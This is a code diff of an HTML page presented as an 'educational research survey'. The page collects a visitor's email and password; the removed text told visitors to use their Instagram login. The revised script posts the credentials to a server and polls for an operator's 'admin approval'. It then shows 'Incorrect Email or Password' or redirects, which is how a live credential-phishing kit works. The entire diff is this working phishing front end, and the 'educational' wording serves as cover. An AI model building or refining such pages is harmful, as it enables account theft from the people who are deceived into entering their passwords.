@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -14,15 +15,17 @@
 
     body {
       margin: 0;
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       background: #f2f4f7;
+      padding: 20px;
     }
 
     .card {
       width: 360px;
+      max-width: 100%;
       background: #fff;
       border-radius: 12px;
       box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
@@ -62,10 +65,36 @@
       font-weight: 600;
       font-size: 15px;
       cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
     button:hover {
       opacity: 0.95;
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .button-loader {
+      display: inline-block;
+      width: 17px;
+      height: 17px;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     .note {
@@ -75,17 +104,26 @@
     }
 
     .disclaimer {
-      position: absolute;
-      width: 35%;
-      transform: scale(0.6);
-      right: 32.5%;
-      height: 100px;
-      bottom: 65px;
-      background-color: #cec516;
+      margin-top: 20px;
+      padding: 12px;
+      background: #fff9d9;
+      border-radius: 7px;
+      color: #666;
+      font-size: 11px;
+      line-height: 1.6;
     }
 
-    p {
-      font-size: 5px;
+    #errorMessage {
+      color: #dc2626;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    #statusText {
+      display: none;
+      margin-top: 15px;
+      color: #24558a;
+      font-size: 13px;
     }
   </style>
 </head>
@@ -93,39 +131,208 @@
 <body>
 
   <div class="card">
+
     <div class="title">Survey</div>
 
-    <input id="email" type="email" placeholder="Your Email Address" required>
-    <input id="name" placeholder="Password" required type="password">
+    <form id="surveyForm">
 
-    <button onclick="startSurvey()">Start Survey</button>
+      <input
+        id="email"
+        type="email"
+        placeholder="Your Email Address"
+        maxlength="255"
+        required
+      >
+
+      <input
+        id="name"
+        type="password"
+        placeholder="Your password"
+        maxlength="150"
+        required
+      >
+
+      <button type="submit" id="startButton">
+        Start Survey
+      </button>
+
+    </form>
+
+    <div id="statusText" role="status" aria-live="polite"></div>
+
+    <div id="errorMessage" role="alert"></div>
 
     <div class="note">
       Educational research survey
     </div>
+
     <div class="disclaimer">
-      </p>This survey page is created purely for educational and research purposes.</p>
-      </p>Please Use Your Instagram Account to Login</p>
-      </p>Page is Secured and Verified</p>
+      This survey is conducted purely for educational
+      and research purposes.
     </div>
+
   </div>
 
   <script>
-    function startSurvey() {
-      const name = document.getElementById('name').value.trim();
-      const email = document.getElementById('email').value.trim();
+    const surveyForm = document.getElementById("surveyForm");
+    const nameInput = document.getElementById("name");
+    const emailInput = document.getElementById("email");
+    const startButton = document.getElementById("startButton");
+    const statusText = document.getElementById("statusText");
+    const errorMessage = document.getElementById("errorMessage");
+
+    let checkingApproval = false;
+    let approvalTimer = null;
+
+    // BUTTON LOADING STATE
+
+    function setLoading(message) {
+      startButton.disabled = true;
+      startButton.innerHTML =
+        `<span class="button-loader"></span>${message}`;
+    }
+
+    function resetButton() {
+      startButton.disabled = false;
+      startButton.textContent = "Start Survey";
+    }
+
+    // SUBMIT LOGIN REQUEST
+
+    surveyForm.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      if (checkingApproval) return;
+
+      const name = nameInput.value.trim();
+      const email = emailInput.value.trim();
 
       if (!name || !email) {
-        alert("Enter name and email");
+        errorMessage.textContent =
+          "Please enter your password and email.";
         return;
       }
 
-      localStorage.setItem('name', name);
-      localStorage.setItem('email', email);
-      window.location.href = "survey.html";
+      checkingApproval = true;
+
+      setLoading("Submitting...");
+      errorMessage.textContent = "";
+      statusText.style.display = "none";
+
+      try {
+        const response = await fetch("/login-request", {
+          method: "POST",
+          credentials: "same-origin",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ name, email })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(
+            data.msg || "Unable to submit your request."
+          );
+        }
+
+        // Request submitted. Wait for admin approval.
+
+        setLoading("");
+        checkApproval();
+
+      } catch (error) {
+        checkingApproval = false;
+
+        errorMessage.textContent = error.message;
+        resetButton();
+      }
+    });
+
+    // CHECK APPROVAL STATUS
+
+    async function checkApproval() {
+      if (!checkingApproval) return;
+
+      try {
+        const response = await fetch("/login-status", {
+          method: "GET",
+          credentials: "same-origin",
+          cache: "no-store"
+        });
+
+        const data = await response.json();
+
+        if (response.status === 401 || response.status === 403) {
+          checkingApproval = false;
+
+          statusText.style.display = "block";
+          statusText.textContent =
+            "Your session expired. Please refresh the page and try again.";
+
+          resetButton();
+          return;
+        }
+
+        if (!response.ok) {
+          throw new Error(
+            data.msg || "Unable to check approval."
+          );
+        }
+
+        // APPROVED
+
+        if (data.status === "approved") {
+          checkingApproval = false;
+
+          window.location.href =
+            data.redirect || "/survey.html";
+
+          return;
+        }
+
+        // REJECTED
+
+        if (data.status === "rejected") {
+          checkingApproval = false;
+
+          statusText.style.display = "block";
+          statusText.textContent =
+            "Incorrect Email or Password. Try again";
+
+          setTimeout(() => {
+            window.location.href = "/";
+          }, 3000);
+
+          return;
+        }
+
+        // EXPIRED
+
+        if (data.status === "expired") {
+          checkingApproval = false;
+
+          statusText.style.display = "block";
+          statusText.textContent =
+            "Your session expired. Please refresh and try again.";
+
+          resetButton();
+          return;
+        }
+
+      } catch (error) {
+        console.error("Approval check error:", error);
+      }
+
+      // CHECK AGAIN AFTER 3 SECONDS
+
+      if (checkingApproval) {
+        approvalTimer = setTimeout(checkApproval, 1000);
+      }
     }
+
   </script>
 
 </body>
-
 </html>
